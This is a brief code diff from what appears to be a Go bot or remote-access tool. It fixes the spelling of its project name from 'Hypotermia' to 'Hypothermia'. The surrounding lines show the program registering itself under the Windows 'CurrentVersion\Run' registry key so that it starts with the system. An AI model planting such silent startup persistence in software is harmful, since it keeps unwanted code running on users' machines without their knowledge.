@@ -6,9 +6,9 @@ import (
 	"os/exec"
 	"path/filepath"
 
-	"Hypotermia/config"
-	"Hypotermia/src/bot"
-	"Hypotermia/src/utils"
+	"Hypothermia/config"
+	"Hypothermia/src/bot"
+	"Hypothermia/src/utils"
 )
 
 func main() {
@@ -77,7 +77,7 @@ func main() {
 	if !config.Debugging && config.AddToStartup {
 		err := utils.SetRegistry(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-			config.HypotermiaName,
+			config.HypothermiaName,
 			fmt.Sprintf("\"%s\" %s", newPath, config.Verifier),
 		)
 
